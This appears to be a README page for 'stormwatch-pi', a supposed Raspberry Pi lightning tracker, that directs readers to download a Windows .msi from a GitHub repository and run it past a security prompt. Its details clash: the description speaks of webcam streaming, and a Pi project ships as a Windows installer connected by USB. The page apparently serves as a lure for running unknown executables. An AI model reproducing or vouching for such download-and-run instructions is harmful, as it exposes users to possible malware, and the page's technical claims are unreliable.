---
layout: "default"
title: "⚡ stormwatch-pi - Keep track of lightning strikes easily"
description: "Stream live video from a USB webcam to a remote server using a Raspberry Pi and Python."
---
# ⚡ stormwatch-pi - Keep track of lightning strikes easily

[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Short-triangle970/stormwatch-pi)

## 📌 About this project

The stormwatch-pi application helps you track lightning activity in your local area. This program connects to your Raspberry Pi hardware to monitor atmospheric changes and sends alerts when lightning strikes occur. It presents data in a simple format that anyone can understand. You do not need to be an expert to operate this system. The software handles the complex data processing automatically so you can focus on the information that matters.

## ⚙️ System requirements

Before you begin, ensure your computer meets these basic requirements. You need a device running Windows 10 or Windows 11. Your computer requires at least 4GB of RAM to run the interface without lag. You also need a stable internet connection to receive real-time updates from your weather sensor. Please keep your Raspberry Pi device nearby, as the initial setup requires a USB connection between the two devices.

## 📥 How to download the program

You can obtain the current version of the software from the official repository. We provide the latest release to ensure you have access to every feature and security fix. 

[Visit this page to download the latest version](https://github.com/Short-triangle970/stormwatch-pi)

Follow these steps to find the correct file:

1. Click the link above to open the repository page.
2. Locate the section labeled Releases on the right side of the screen.
3. Click the latest version number.
4. Scroll down to the Assets list.
5. Select the file ending in .msi to start your download.

## 🛠️ Installation steps

Once your file finishes downloading, follow these steps to install the software on your Windows machine:

1. Locate the file in your Downloads folder.
2. Double-click the file to start the installer.
3. A security window might appear. Click Run if prompted.
4. Follow the instructions that appear in the setup window.
5. Agree to the standard usage terms.
6. Choose the default folder for the installation to ensure the software stays compatible with all system paths.
7. Click Finish when the installation bar reaches the end.

## 🔌 Connecting your hardware

After installation, connect your Raspberry Pi to your Windows computer using a standard USB-C or Micro-USB cable. The software should detect the device automatically. If the software does not show a green light in the status corner, try a different USB port on your computer. Keep your Raspberry Pi away from metal objects or heavy electronics, as these can interfere with the sensitivity of the lightning sensor.

## 🖥️ Using the software

When you open the application, you see a dashboard with three main tabs: Overview, History, and Settings. 

The Overview tab shows you the current status of your sensor. If the system detects a strike, the screen updates instantly. You will see the estimated distance of the strike and the time of the event.

The History tab keeps a log of past strikes. You can use this tab to review patterns over the last week or month. This helps you understand how frequent storms are in your specific location.

The Settings tab lets you adjust alerts. If you want a sound to play during a strike, go to Settings and check the box labeled Audio Alerts. You can also change the distance threshold here. The sensor triggers an alert only when the storm enters your specified range. This prevents the program from notifying you about distant storms that pose no threat.

## 🔍 Troubleshooting common issues

If you encounter a problem, check these common fixes first. 

If the program fails to start, ensure you have the latest Windows updates. Outdated versions of Windows sometimes block background services that the program requires. 

If the sensor shows no data, close the program and unplug your Raspberry Pi. Wait ten seconds, plug it back in, and restart the application. This power cycle resets the connection between the hardware and the software.

If you lose your network connection, your data will save locally on your hard drive. As soon as your internet connection returns, the application will synchronize with the central API to update your historical records.

## 📈 Understanding the data

The lightning sensor detects electromagnetic pulses that occur during a strike. The program translates these pulses into a distance calculation. Because lightning creates a surge in high-frequency radio waves, the sensor can estimate location with high accuracy. 

Remember that the sensor provides data as a line-of-sight calculation. Obstacles like large buildings or mountains might alter the accuracy of the reading. For the best performance, place the Raspberry Pi near a window or in a location with limited electronic interference.